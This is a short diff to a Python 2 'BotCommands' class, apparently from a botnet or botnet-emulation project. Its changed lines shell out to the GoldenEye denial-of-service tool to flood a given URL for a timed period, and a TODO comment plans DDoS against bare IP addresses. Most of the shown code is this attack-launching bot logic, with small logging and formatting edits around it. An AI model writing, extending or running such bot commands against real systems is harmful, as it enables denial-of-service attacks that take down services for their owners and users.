@@ -1,6 +1,6 @@
 #!/usr/bin/env python2
 # coding=UTF-8
-import logging, string, subprocess, shlex
+import logging, subprocess, shlex
 from resources import emu_config
 
 class BotCommands(object):
@@ -12,7 +12,7 @@ class BotCommands(object):
 
     def joinParams(self, hallo, hello):
         """Echos its parameters back"""
-        return hallo + hello
+        return hallo + " " + hello
 
     def default_command(self, **kwargs):
         """Echos its parameters back"""
@@ -24,8 +24,8 @@ class BotCommands(object):
                 logging.debug("goldeneye: %s" % self.ddos_process.communicate())
 
             if url:
-                ddos_process = subprocess.Popen(
-                    shlex.split("timeout %d goldeneye %s -m random "%(timeout, url)))
+                logging.info("timeout %d goldeneye %s -m random "%(timeout, url))
+                ddos_process = subprocess.Popen(shlex.split("timeout %d goldeneye %s -m random "%(timeout, url)))
             elif ip:
                 # TODO: DDOS eine IP
                 pass
